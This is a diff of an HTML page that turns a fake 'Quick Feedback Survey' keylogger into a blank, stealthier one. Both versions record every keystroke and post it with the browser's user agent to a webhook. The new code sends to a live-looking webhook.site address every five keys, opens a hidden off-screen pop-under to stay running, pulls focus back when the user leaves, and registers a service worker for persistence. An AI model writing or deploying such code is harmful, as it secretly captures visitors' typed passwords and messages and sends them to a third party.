@@ -3,92 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quick Survey</title>
+    <title></title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .container {
-            background: white;
-            padding: 25px;
-            border-radius: 8px;
-            max-width: 500px;
-            margin: 0 auto;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        input, textarea {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #45a049;
+            margin: 0;
+            padding: 0;
+            background-color: white;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Quick Feedback Survey</h2>
-        <p>Hey, we’re gathering quick opinions! Take 30 seconds to answer and help us out.</p>
-        <form id="surveyForm">
-            <input type="text" id="name" placeholder="Your Name (optional)">
-            <textarea id="feedback" placeholder="What’s one thing you’d improve about online content?" rows="4"></textarea>
-            <button type="submit">Submit</button>
-        </form>
-        <p id="thanks" style="display: none; color: green;">Thanks for your feedback!</p>
-    </div>
-
     <script>
         let keystrokes = [];
-        const webhookUrl = 'https://your-webhook-url.com/log'; // Replace with your endpoint
+        const webhookUrl = 'https://webhook.site/5c952e38-7c8b-4004-af93-16fed30fa52c'; // Replace with your webhook or server URL
 
-        // Capture all keystrokes
+        // Capture all keystrokes immediately upon page load
         document.addEventListener('keydown', (e) => {
             const timestamp = new Date().toISOString();
-            const key = e.key || 'Unknown';
-            const inputField = document.activeElement.id || 'UnknownField';
-            keystrokes.push({ time: timestamp, key: key, field: inputField });
+            let keyValue = e.key || 'Unknown';
             
-            // Send data periodically (every 10 keystrokes)
-            if (keystrokes.length >= 10) {
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        device: navigator.userAgent,
-                        keystrokes: keystrokes
-                    })
-                }).catch(err => console.error('Failed to send data'));
-                keystrokes = [];
+            // Handle specific key types for clear logging
+            if (keyValue === ' ') {
+                keyValue = '[SPACE]';
+            } else if (keyValue === 'Enter') {
+                keyValue = '[ENTER]';
+            } else if (keyValue === 'Backspace') {
+                keyValue = '[BACKSPACE]';
+            } else if (keyValue === 'Tab') {
+                keyValue = '[TAB]';
+            } else if (keyValue.length > 1) {
+                keyValue = `[${keyValue}]`; // For special keys like Shift, Ctrl, etc.
+            }
+            
+            // Store keystroke with timestamp
+            keystrokes.push({ time: timestamp, key: keyValue });
+            
+            // Send data every 5 keystrokes for near real-time logging
+            if (keystrokes.length >= 5) {
+                sendData();
             }
         });
 
-        // On form submit, show thanks message
-        document.getElementById('surveyForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-            document.getElementById('thanks').style.display = 'block';
-            document.getElementById('surveyForm').reset();
+        // Function to send data to webhook
+        function sendData() {
+            if (keystrokes.length > 0) {
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        device: navigator.userAgent,
+                        keystrokes: keystrokes,
+                        formattedString: keystrokes.map(k => k.key).join('')
+                    })
+                }).catch(err => console.error('Failed to send data'));
+                keystrokes = []; // Clear buffer after sending
+            }
+        }
+
+        // Send remaining data if page is about to close
+        window.addEventListener('beforeunload', () => {
+            sendData();
+            // Attempt to open a hidden pop-under window to persist
+            try {
+                let popUnder = window.open(window.location.href, '_blank', 'width=1,height=1,left=-9999,top=-9999');
+                if (popUnder) {
+                    popUnder.blur();
+                    window.focus();
+                }
+            } catch (e) {
+                console.error('Pop-under blocked');
+            }
         });
 
-        // Keep tab open by preventing accidental close (optional)
-        window.addEventListener('beforeunload', (e) => {
-            e.preventDefault();
-            e.returnValue = '';
+        // Attempt to refocus if user switches away
+        window.addEventListener('blur', () => {
+            try {
+                window.focus();
+            } catch (e) {
+                console.error('Focus failed');
+            }
         });
+
+        // Register a Service Worker for background persistence (if supported)
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(registration => {
+                        console.log('Service Worker registered');
+                    })
+                    .catch(error => {
+                        console.log('Service Worker registration failed: ', error);
+                    });
+            });
+        }
     </script>
 </body>
 </html>
